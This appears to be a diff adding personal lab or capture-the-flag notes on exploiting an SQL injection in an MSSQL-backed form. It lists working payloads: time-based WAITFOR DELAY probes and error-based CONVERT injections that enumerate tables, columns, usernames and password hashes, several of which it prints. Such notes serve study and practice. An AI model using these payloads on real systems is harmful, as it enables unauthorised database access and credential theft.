@@ -1,0 +1,42 @@
+------------------
+NOTES
+------------------
+
+Clearly a SQL injection but testing reveals that he query is not just a UNION SELECT like before
+adding a user to the db
+	could look like:
+		INSERT INTO employees
+		VALUES (1, 'Miller', 'Peter', 80000);
+	where the VALUES are the responses in the form
+	therefore need to close the ();
+
+	POC injection:
+		in user:
+			a', 'a');  WAITFOR DELAY '0:0:5'; --
+		in email:
+			'); WAITFOR DELAY '0:0:5'--
+
+		no text is displayed, cant display data from the db :(
+			unless used timed - hell nah
+
+	displaying text when nothing is returned
+		error based
+		https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
+		cause an error where the data is returned in the error
+
+		'); SELECT @@version WHERE 1=1 AND 1=CONVERT(INT,@@version)--
+
+		only table is this db is users
+			'); SELECT @@version WHERE 1=1 AND 1=CONVERT(INT,(SELECT top 1 TABLE_NAME FROM information_schema.TABLES WHERE TABLE_NAME NOT IN ('users')))--
+
+		users table has columns username, user_id, and email
+			'); SELECT @@version WHERE 1=1 AND 1=CONVERT(INT,(SELECT top 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='users' AND column_name NOT IN ('username', 'user_id', 'email')))--
+
+		usernames are eric, alice, pedro and admin
+			'); SELECT @@version WHERE 1=1 AND 1=CONVERT(INT,(SELECT top 1 username FROM users WHERE username NOT IN ('eric', 'alice', 'pedro', 'admin'))) --
+
+
+			'); SELECT 1 WHERE 1=1 AND 1=CONVERT(INT,(SELECT top 1 psw FROM archive..pmanager WHERE psw NOT IN ('7de6b6f0afadd89c3ed558da43930181', '5b413fe170836079622f4131fe6efa2d', '3c744b99b8623362b466efb7203fd182', 'cb2d5be3c78be06d47b697468ad3b33b')))--
+
+
+			fuck this bullshit man
